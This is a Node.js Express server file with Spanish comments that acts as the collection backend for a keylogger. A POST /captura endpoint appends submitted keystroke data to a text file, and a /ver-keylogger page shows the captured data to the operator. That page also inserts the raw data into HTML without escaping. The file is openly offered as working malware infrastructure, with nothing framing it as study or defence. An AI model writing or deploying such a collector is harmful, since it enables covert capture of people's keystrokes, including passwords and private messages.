const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs').promises;
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware - orden correcto
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '../public')));

// Rutas API
app.post('/captura', async (req, res) => {
  try {
    const data = JSON.stringify({
      ...req.body,
      timestamp: new Date().toISOString()
    }) + '\n';
    
    await fs.appendFile(path.join(__dirname, '../datos.txt'), data);
    res.json({ ok: true });
  } catch (error) {
    console.error('Error al guardar datos:', error);
    res.status(500).json({ error: 'Error interno del servidor' });
  }
});

app.get('/ver-keylogger', async (req, res) => {
  try {
    const data = await fs.readFile(path.join(__dirname, '../datos.txt'), 'utf8');
    res.send(`
      <!DOCTYPE html>
      <html lang="es">
      <head>
        <meta charset="UTF-8">
        <title>Datos Capturados</title>
        <style>
          body { font-family: Arial, sans-serif; margin: 20px; }
          pre { background: #f5f5f5; padding: 10px; border-radius: 5px; }
        </style>
      </head>
      <body>
        <h1>Datos Capturados del Keylogger</h1>
        <pre>${data}</pre>
        <a href="/">Volver al inicio</a>
      </body>
      </html>
    `);
  } catch (error) {
    if (error.code === 'ENOENT') {
      res.send(`
        <!DOCTYPE html>
        <html lang="es">
        <head>
          <meta charset="UTF-8">
          <title>Sin Datos</title>
        </head>
        <body>
          <h1>No hay datos capturados aún</h1>
          <p>Utiliza el keylogger para capturar algunas teclas primero.</p>
          <a href="/">Volver al inicio</a>
        </body>
        </html>
      `);
    } else {
      console.error('Error al leer datos:', error);
      res.status(500).send('Error al leer datos');
    }
  }
});

// Endpoint de diagnóstico
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    server: 'backend-prueba',
    version: '1.0.0',
    endpoints: [
      'GET /',
      'GET /health',
      'GET /ver-keylogger', 
      'POST /captura'
    ]
  });
});

// Ruta por defecto para el SPA
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

// Manejo de errores global
app.use((err, req, res, next) => {
  console.error('Error no manejado:', err);
  res.status(500).json({ error: 'Error interno del servidor' });
});

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`✅ Servidor escuchando en el puerto ${PORT}`);
  console.log(`📁 Archivos estáticos servidos desde: ${path.join(__dirname, '../public')}`);
  console.log(`🌐 Visita: http://localhost:${PORT}`);
});